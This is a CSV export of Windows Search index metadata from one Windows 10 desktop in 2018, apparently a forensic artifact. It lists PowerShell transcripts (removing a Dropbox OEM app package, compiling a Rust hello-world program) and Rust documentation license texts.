0F-InvertedOnlyMD5,0-InvertedOnlyPids,11-System_FileName,13F-System_Size,14F-System_FileAttributes,15F-System_DateModified,16F-System_DateCreated,17F-System_DateAccessed,33-System_ItemUrl,3-System_ItemFolderNameDisplay,4165-System_ComputerName,4334-System_ContentType,4346-System_DateImported,4352-System_Document_DateCreated,4354-System_Document_DateSaved,4373-System_FileExtension,4377-System_FileOwner,4378-System_FilePlaceholderStatus,4410-System_IsAttachment,4412-System_IsEncrypted,4415-System_IsFolder,4419-System_ItemDate,4421-System_ItemFolderPathDisplay,4422-System_ItemFolderPathDisplayNarrow,4423-System_ItemName,4424-System_ItemNameDisplay,4425-System_ItemNameDisplayWithoutExtension,4428-System_ItemPathDisplay,4429-System_ItemPathDisplayNarrow,4431-System_ItemType,4437-System_Kind,4438-System_KindText,4453-System_MIMEType,4540-System_NotUserContent,4546-System_ParsingName,4604-System_SFGAOFlags,4605-System_Search_AccessCount,4606-System_Search_AutoSummary,4612F-System_Search_GatherTime,4614-System_Search_LastIndexedTotalTime,4618-System_Search_Store,4655-System_ThumbnailCacheId,4679-System_VolumeId,5-System_ItemTypeText,WorkID
"882A0F70E5AF1A0F70A7471E535667A2","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","1010","Archive (32)","26/04/2018 18:32:47.6086819","26/04/2018 18:32:44.7034155","26/04/2018 18:32:44.7034155","file:C:/Users/itsupport/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 18:32:46.0000000","26/04/2018 18:32:46.0000000","26/04/2018 18:32:47.6086819",".txt","DESKTOP-EDSLQM8\itsupport","6","False","False","False","26/04/2018 18:32:47.6086819","C:\Users\itsupport\Documents\20180426","20180426 (C:\Users\itsupport\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244","C:\Users\itsupport\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244 (C:\Users\itsupport\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.s+KGHmnY.20180426123244.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180426123244
Username: DESKTOP-EDSLQM8\itsupport
RunAs User: DESKTOP-EDSLQM8\itsupport
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell Get-AppxProvisionedPackage -Online | Where-Object DisplayName -In ""C27EB4BA.DropboxOEM"" | Remove-ProvisionedAppxPackage -Online
Process ID: 4664
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Get-AppxProvisionedPackage -Online | Where-Object DisplayName -In ""C27EB4BA.DropboxOEM"" | Remove-ProvisionedAppxPackage -Online
PS>$global:?
True
**********************
Windows PowerShell transcript end
End time: 20180426123247
**********************
","26/04/2018 18:32:47.6243054","0,015625","file","F6FAE9E6526FE05F","804cb650-0000-0000-0000-501f00000000","Text Document","2912"
"D1E9AA888D79D0FC56A9205173FF814C","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","807","Archive (32)","11/04/2018 16:26:30.9618685","11/04/2018 16:26:23.6336843","11/04/2018 16:26:23.6336843","file:C:/Users/maxpowers/Documents/20180411/PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","20180411","DESKTOP-EDSLQM8","text/plain","11/04/2018 16:26:24.0000000","11/04/2018 16:26:24.0000000","11/04/2018 16:26:30.9618685",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","11/04/2018 16:26:30.9618685","C:\Users\maxpowers\Documents\20180411","20180411 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623","C:\Users\maxpowers\Documents\20180411\PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623 (C:\Users\maxpowers\Documents\20180411)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.WG3omz0G.20180411102623.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180411102623
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff\rust'
Process ID: 4012
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff\rust'
PS C:\Users\maxpowers\Documents\stuff\rust> .\rt.exe
Hello World!
","11/04/2018 16:26:51.3992503","0,078125","file","3B15AD8D4C1C4AF6","804cb650-0000-0000-0000-501f00000000","Text Document","3375"
"7E11908960A94C3030A63BBB1B5D068B","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","6725","Archive (32)","11/04/2018 16:25:02.3837464","11/04/2018 16:21:14.1805974","11/04/2018 16:21:14.1805974","file:C:/Users/maxpowers/Documents/20180411/PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","20180411","DESKTOP-EDSLQM8","text/plain","11/04/2018 16:21:16.0000000","11/04/2018 16:21:16.0000000","11/04/2018 16:25:02.3837464",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","11/04/2018 16:25:02.3837464","C:\Users\maxpowers\Documents\20180411","20180411 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114","C:\Users\maxpowers\Documents\20180411\PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114 (C:\Users\maxpowers\Documents\20180411)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.2MQkrO0C.20180411102114.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180411102114
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff\rust'
Process ID: 5836
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff\rust'
PS C:\Users\maxpowers\Documents\stuff\rust> rustc .\rt.rs
error[E0601]: main function not found

error: aborting due to previous error
PS C:\Users\maxpowers\Documents\stuff\rust> rustc .\rt.rs --release
error: Unrecognized option: 'release'
PS C:\Users\maxpowers\Documents\stuff\rus","11/04/2018 16:26:54.7429963","0","file","BEDC082D5DDF338F","804cb650-0000-0000-0000-501f00000000","Text Document","3376"
"1EF280A37FBED7889171636A7E43836D","140015124E12","COPYRIGHT.txt","2310","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:12:50.2898649","11/04/2018 16:12:50.2898649","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/COPYRIGHT.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","COPYRIGHT.txt","COPYRIGHT.txt","COPYRIGHT","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\COPYRIGHT.txt","COPYRIGHT (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","COPYRIGHT.txt","1077936503","0","These documentation pages include resources by third parties. This copyright
file applies only to those resources. The following third party resources are
included, and carry their own copyright notices and license terms:

* Fira Sans (FiraSans-Regular.woff, FiraSans-Medium.woff):

    Copyright (c) 2014, Mozilla Foundation https://mozilla.org/
    with Reserved Font Name Fira Sans.

    Copyright (c) 2014, Telefonica S.A.

    Licensed under the SIL Open Font License, Version 1.1.
    See FiraSans-LICENSE.txt.

* Heuristica (Heuristica-Italic.woff):

    Copyright 1989, 1991 Adobe Systems Incorporated. All rights reserved.
    Utopia is either a registered trademark or trademark of Adobe Systems
    Incorporated in the United States and/or other countries. Used under
    license.

    Copyright 2006 Han The Thanh, Vntopia font family, http://vntex.sf.net

    Copyright (c) 2008-2012, Andrey V. Panov ([email]),
    with Reserved Font Name Heuristica.

    Licensed under the SIL Open Font Lic","11/04/2018 16:15:57.6806450","0,015625","file","FD4E177B2BC5A522","804cb650-0000-0000-0000-501f00000000","Text Document","10185"
"8D4DECB56109596A4655E97CAE72E98B","140015124E12","FiraSans-LICENSE.txt","4530","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:00.7898424","11/04/2018 16:13:00.7898424","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/FiraSans-LICENSE.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","FiraSans-LICENSE.txt","FiraSans-LICENSE.txt","FiraSans-LICENSE","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\FiraSans-LICENSE.txt","FiraSans-LICENSE (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","FiraSans-LICENSE.txt","1077936503","0","Copyright (c) 2014, Mozilla Foundation https://mozilla.org/
with Reserved Font Name Fira Sans.

Copyright (c) 2014, Mozilla Foundation https://mozilla.org/
with Reserved Font Name Fira Mono.

Copyright (c) 2014, Telefonica S.A.

This Font Software is licensed under the SIL Open Font License, Version 1.1.
This license is copied below, and is also available with a FAQ at:
http://scripts.sil.org/OFL


-----------------------------------------------------------
SIL OPEN FONT LICENSE Version 1.1 - 26 February 2007
-----------------------------------------------------------

PREAMBLE
The goals of the Open Font License (OFL) are to stimulate worldwide
development of collaborative font projects, to support the font creation
efforts of academic and linguistic communities, and to provide a free and
open framework in which fonts may be shared and improved in partnership
with others.

The OFL allows the licensed fonts to be used, studied, modified and
redistributed freely as long as they are not sold by themselves. The
f","11/04/2018 16:15:36.6182933","0","file","3D5C8EE248AD2594","804cb650-0000-0000-0000-501f00000000","Text Document","11702"
"96FABA4AC416899B2C5F8F2CB129FDF3","140015124E12","Heuristica-LICENSE.txt","4699","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:00.9305246","11/04/2018 16:13:00.9305246","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/Heuristica-LICENSE.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","Heuristica-LICENSE.txt","Heuristica-LICENSE.txt","Heuristica-LICENSE","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\Heuristica-LICENSE.txt","Heuristica-LICENSE (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","Heuristica-LICENSE.txt","1077936503","0","Copyright 1989, 1991 Adobe Systems Incorporated. All rights reserved.
Utopia is either a registered trademark or trademark of Adobe Systems
Incorporated in the United States and/or other countries. Used under
license.

Copyright 2006 Han The Thanh, Vntopia font family, http://vntex.sf.net

Copyright (c) 2008-2012, Andrey V. Panov ([email]),
with Reserved Font Name Heuristica.

This Font Software is licensed under the SIL Open Font License, Version 1.1.
This license is copied below, and is also available with a FAQ at:
http://scripts.sil.org/OFL


-----------------------------------------------------------
SIL OPEN FONT LICENSE Version 1.1 - 26 February 2007
-----------------------------------------------------------

PREAMBLE
The goals of the Open Font License (OFL) are to stimulate worldwide
development of collaborative font projects, to support the font creation
efforts of academic and linguistic communities, and to provide a free and
open framework in which fonts may be shared and improve","11/04/2018 16:15:36.4461007","0","file","4A3B58E4E1DB675A","804cb650-0000-0000-0000-501f00000000","Text Document","11719"
"B5B4525D8860F283973F87990FAE7277","140015124E12","LICENSE-APACHE.txt","10847","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:02.9148575","11/04/2018 16:13:02.9148575","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/LICENSE-APACHE.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","LICENSE-APACHE.txt","LICENSE-APACHE.txt","LICENSE-APACHE","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\LICENSE-APACHE.txt","LICENSE-APACHE (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","LICENSE-APACHE.txt","1077936503","0","Apache License
                        Version 2.0, January 2004
                     http://www.apache.org/licenses/

TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

1. Definitions.

   ""License"" shall mean the terms and conditions for use, reproduction,
   and distribution as defined by Sections 1 through 9 of this document.

   ""Licensor"" shall mean the copyright owner or entity authorized by
   the copyright owner that is granting the License.

   ""Legal Entity"" shall mean the union of the acting entity and all
   other entities that control, are controlled by, or are under common
   control with that entity. For the purposes of this definition,
   ""control"" means (i) the power, direct or indirect, to cause the
   direction or management of such entity, whether by contract or
   otherwise, or (ii) ownership of fifty percent (50%) or more of the
   outstanding shares, or (iii) beneficial ownership of such entity.

   ""You"" (or ""Your"") shall mean an individual or Legal Entity
   exercising per","11/04/2018 16:15:34.1336040","0,015625","file","98BAA1BC4CCC4C00","804cb650-0000-0000-0000-501f00000000","Text Document","12067"
"D64E7A367667B617B73932B3F286C415","140015124E12","LICENSE-MIT.txt","1023","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:02.9148575","11/04/2018 16:13:02.9148575","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/LICENSE-MIT.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","LICENSE-MIT.txt","LICENSE-MIT.txt","LICENSE-MIT","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\LICENSE-MIT.txt","LICENSE-MIT (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","LICENSE-MIT.txt","1077936503","0","Permission is hereby granted, free of charge, to any
person obtaining a copy of this software and associated
documentation files (the ""Software""), to deal in the
Software without restriction, including without
limitation the rights to use, copy, modify, merge,
publish, distribute, sublicense, and/or sell copies of
the Software, and to permit persons to whom the Software
is furnished to do so, subject to the following
conditions:

The above copyright notice and this permission notice
shall be included in all copies or substantial portions
of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF
ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED
TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT
SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR
IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
DEALINGS IN THE SOFTWARE.
","11/04/2018 16:15:34.1181330","0","file","E9807FE929745C8B","804cb650-0000-0000-0000-501f00000000","Text Document","12068"
"51479604690A37443662ADF5A36AF8BD","140015124E12","SourceCodePro-LICENSE.txt","4528","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:06.0867296","11/04/2018 16:13:06.0867296","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/SourceCodePro-LICENSE.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","SourceCodePro-LICENSE.txt","SourceCodePro-LICENSE.txt","SourceCodePro-LICENSE","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\SourceCodePro-LICENSE.txt","SourceCodePro-LICENSE (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","SourceCodePro-LICENSE.txt","1077936503","0","Copyright 2010, 2012 Adobe Systems Incorporated (http://www.adobe.com/), with Reserved Font Name 'Source'. All Rights Reserved. Source is a trademark of Adobe Systems Incorporated in the United States and/or other countries.

This Font Software is licensed under the SIL Open Font License, Version 1.1.

This license is copied below, and is also available with a FAQ at: http://scripts.sil.org/OFL


-----------------------------------------------------------
SIL OPEN FONT LICENSE Version 1.1 - 26 February 2007
-----------------------------------------------------------

PREAMBLE
The goals of the Open Font License (OFL) are to stimulate worldwide
development of collaborative font projects, to support the font creation
efforts of academic and linguistic communities, and to provide a free and
open framework in which fonts may be shared and improved in partnership
with others.

The OFL allows the licensed fonts to be used, studied, modified and
redistributed freely as long as they are not sold by themselves. The
fon","11/04/2018 16:15:22.1492808","0,015625","file","8573866A1AB9FED9","804cb650-0000-0000-0000-501f00000000","Text Document","12573"
"5F978BA8E5C1D63D1E61AD17927F0237","140015124E12","SourceSerifPro-LICENSE.txt","4522","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:06.1179615","11/04/2018 16:13:06.1179615","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/SourceSerifPro-LICENSE.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","SourceSerifPro-LICENSE.txt","SourceSerifPro-LICENSE.txt","SourceSerifPro-LICENSE","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\SourceSerifPro-LICENSE.txt","SourceSerifPro-LICENSE (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","SourceSerifPro-LICENSE.txt","1077936503","0","Copyright 2014 Adobe Systems Incorporated (http://www.adobe.com/), with Reserved Font Name 'Source'. All Rights Reserved. Source is a trademark of Adobe Systems Incorporated in the United States and/or other countries.

This Font Software is licensed under the SIL Open Font License, Version 1.1.

This license is copied below, and is also available with a FAQ at: http://scripts.sil.org/OFL


-----------------------------------------------------------
SIL OPEN FONT LICENSE Version 1.1 - 26 February 2007
-----------------------------------------------------------

PREAMBLE
The goals of the Open Font License (OFL) are to stimulate worldwide
development of collaborative font projects, to support the font creation
efforts of academic and linguistic communities, and to provide a free and
open framework in which fonts may be shared and improved in partnership
with others.

The OFL allows the licensed fonts to be used, studied, modified and
redistributed freely as long as they are not sold by themselves. The
fonts, in","11/04/2018 16:15:22.1023721","0,015625","file","CDB2FD2263555493","804cb650-0000-0000-0000-501f00000000","Text Document","12577"
